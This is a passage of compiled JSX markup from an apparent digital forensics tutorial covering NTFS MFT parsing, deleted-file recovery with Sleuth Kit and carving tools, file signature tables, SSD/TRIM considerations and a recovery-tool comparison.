        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Slack Space"
        }), " → MFT entry at 1024 bytes may not be fully used; residual data from previous MFT entries exists in unused bytes."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Resident vs Non-Resident"
        }), " → Small files (<~700 bytes) are stored entirely within the MFT entry: $DATA attribute is resident."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MFT Parsing Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# analyzeMFT: Parse MFT to CSV\nanalyzeMFT.py -f \"\\$MFT\" -o mft-output.csv\n\n# MFTECmd: Parse MFT with multiple output formats\nMFTECmd.exe -f \"\\$MFT\" --csv mft-output.csv\nMFTECmd.exe -f \"\\$MFT\" --json mft-output.json\nMFTECmd.exe -f \"\\$MFT\" --body mft-output.body --bodyfull\n\n# Sleuth Kit: MFT-specific commands\nistat ntfs-image.dd 0     # MFT entry 0 ($MFT itself)\nistat ntfs-image.dd 45    # Specific file entry 45\n\n# Recover MFT if deleted or corrupted\n# MFT is stored in the $MFT file in the root of the NTFS volume\n# Can be recovered from $MFTMirr for the first 4 entries\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MFTECmd Output Example:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "MFT Entry #   | File Name       | Extension | Parent Ref | Created Date        | Modified Date   | Access Date | Flags   | Size    | Resident | Slack\n45            | Invoice_2024    | .pdf      | 5          | 2024-06-15 14:30:00 | 2024-06-15       | 2024-06-15  | File    | 124,536 | No       | 456\n46            | .invoice_tmp    | .tmp      | 5          | 2024-06-15 14:29:58 | 2024-06-15       | 2024-06-15  | Deleted | 0       | Yes      | 0\n47            | report.docx     | .docx     | 5          | 2024-06-10 09:00:00 | 2024-06-12       | 2024-06-15  | File    | 45,002  | No       | 128\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "From this output, we can see:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Entry 46 was deleted → it's a temporary file likely created by the malicious document"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Entry 45 was created at 14:30 → the malicious PDF"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Entry 47 was opened at 14:30 → the user accessed the report (likely clicked the attachment)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "44-deleted-file-recovery",
      children: "4.4 Deleted File Recovery"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A library's checkout system shows that \"Book-45\" is available (deleted). But the book is still on the shelf. Only when a new book needs that exact shelf space is the old book thrown away. A forensic analyst walks through the library and finds all books marked as \"available\" that are still on the shelf."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "How Deletion Works in Each File System:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "File System"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Deletion Behavior"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Recovery Potential"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MFT entry flag = 0x00, bitmap cluster marked free. Data intact until overwritten"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (unless TRIM)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "FAT32"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "First byte of filename set to 0xE5 (sigma), FAT entries zeroed. Data intact"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ext4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Inode marked free, block bitmap updated. Data intact until overwritten"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium-High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "APFS (macOS)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extent records modified, space freed. Copy-on-write may preserve old copies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SSD"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "TRIM command erases blocks at hardware level"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very Low"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Deleted File Recovery Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Sleuth Kit: fls with deleted files flag\nfls -rd /dev/sdb1 > deleted-files.txt\n\n# fls output interpretation:\n# r/r 128-128-1:    deleted_file.pdf\n# r/r * 128-128-1:  deleted_file.pdf (reallocated)\n# d/d * 45:         deleted_directory/ (reallocated)\n\n# Recover specific file using inode number\nicat /dev/sdb1 128 > recovered_file.pdf\n\n# Recover all deleted files (bulk)\ntsk_recover -e /dev/sdb1 /recovery/output/\n\n# PhotoRec: Carve deleted files by signature\nsudo photorec /evidence/disk.dd\n# PhotoRec options:\n# - File types to search (select all or specific)\n# - Partition type (Intel/EFI/GPT)\n# - Output directory\n\n# TestDisk: Recover deleted partitions\nsudo testdisk /evidence/disk.dd\n# → Analyze → Quick Search → Deeper Search → Write partition table\n\n# Foremost: File carving tool\nforemost -t pdf,jpg,zip -i /evidence/disk.dd -o /evidence/carved/\n\n# Scalpel: Configuration-driven file carving\nscalpel /evidence/disk.dd -o /evidence/carved/\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Sleuth Kit Commands Reference:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Command"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Purpose"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "fls"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "List file names in a disk image"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "fls -f ntfs -r image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "ils"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "List inode/file metadata"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "ils -f ext4 image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "icat"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Output contents of file by inode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "icat image.dd 45 > out.pdf"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "ifind"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find inode of deleted file"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "ifind -d 45 -f ntfs image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "istat"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Display inode/file metadata"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "istat -f ntfs image.dd 45"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "jcat"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extract journal data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "jcat -f ext4 image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "jls"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "List entries in file system journal"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "jls -f ext4 image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "mmcat"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Output partition content"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "mmcat image.dd 1 > partition1.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "mmls"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Display partition layout"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "mmls image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "sigfind"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Search for binary signature"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "sigfind -l \"PK\" image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "sorter"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sort files by type"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "sorter -f ntfs -d sorted/ -s image.dd"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "srchstrings"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Search for ASCII/Unicode strings"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "srchstrings -a image.dd > strings.txt"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_comparedir"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compare TSK database to directory"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_comparedir -d /mnt evidence.db"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_gettimes"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extract timeline data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_gettimes image.dd > timeline.body"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_loaddb"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Load image into SQLite database"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_loaddb image.dd evidence.db"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_recover"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recover files from image"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tsk_recover -e image.dd /output/"
            })
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "45-file-carving",
      children: "4.5 File Carving"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A paper shredder tears documents into strips. File carving is like trying to piece together shredded documents by matching colors and paper textures, without having the original document index. You know that PDFs start with \"%PDF\" and end with \"%%EOF\", so you look for those markers in the shredder bin."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "How File Carving Works:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Scan the raw disk surface byte by byte"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Match magic bytes (file signatures) against a database"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Once a header is found, read until the matching footer is found"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "If no footer exists, estimate file size from header metadata (JPEG height/width, etc.)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Common File Signatures (Magic Bytes):"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "File Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Header (Hex)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Footer (Hex)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Carving Complexity"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "JPEG"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FF D8 FF E0 / FF D8 FF E1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FF D9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (bounded)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PNG"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "89 50 4E 47"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AE 42 60 82"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (bounded)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PDF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "25 50 44 46"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "25 25 45 4F 46"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (may have trailing data)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ZIP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "50 4B 03 04"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "50 4B 05 06"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (nested archives)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DOCX/XLSX/PPTX"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "50 4B 03 04 (ZIP-based)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "50 4B 05 06"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (ZIP extraction needed)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AVI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "52 49 46 46"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "→"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (size from header)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MP4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "00 00 00 18 66 74 79 70"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "→"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ELF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "7F 45 4C 46"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "→"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (bounded sections)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PE (EXE/DLL)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4D 5A"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "→"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (PE header specifies size)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Advanced Carving Techniques:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Bifragment Gap Carving"
        }), " → recovers files split into two fragments"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Smart Carving"
        }), " → uses file structure knowledge (not just headers/footers)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Statistical Carving"
        }), " → analyzes entropy to identify file type boundaries"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Object Validation"
        }), " → validates each carved fragment (e.g., checksum verification for ZIP)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "46-ssd-and-trim-considerations",
      children: "4.6 SSD and TRIM Considerations"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "SSDs pose significant challenges for traditional forensics:"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Challenge"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "TRIM command"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Permanently erases deleted file data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Image before OS TRIM executes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Garbage collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Background erase of unused blocks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Power-off capture may lose data"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Wear leveling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data blocks move without file system knowledge"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No mitigation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Over-provisioning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hidden spare blocks not addressable"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot acquire over-provisioned area"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NVMe encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Self-encrypting drives lock on power loss"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hot capture while system runs"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SSD Forensic Best Practices:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Never power down an SSD suspect system → capture live"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use hardware write-blocker that supports TRIM passthrough"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Capture RAM before disk (encryption keys may be in memory)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document SSD model and firmware version (some controllers have known forensic behaviors)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Consider chip-off forensics for severely damaged or encrypted SSDs"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "47-data-recovery-tools-comparison",
      children: "4.7 Data Recovery Tools Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Tool"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "File Systems"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Best For"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Cost"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Sleuth Kit (Autopsy)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CLI/GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, ext4, HFS+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full forensic analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "FTK Imager"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, ext4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Preview and acquisition"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "EnCase"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, ext4, HFS+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enterprise forensic suite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Commercial"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "X-Ways Forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, ext4, HFS+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fast, lightweight analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Commercial"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "R-Studio"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, ext4, HFS+, APFS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Complex RAID recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Commercial"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PhotoRec"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CLI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All (raw scan)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File carving"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Foremost"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CLI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All (raw scan)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Linux-oriented carving"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Scalpel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CLI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All (raw scan)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Configurable carving"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RecoverMyFiles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User-friendly recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Commercial"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
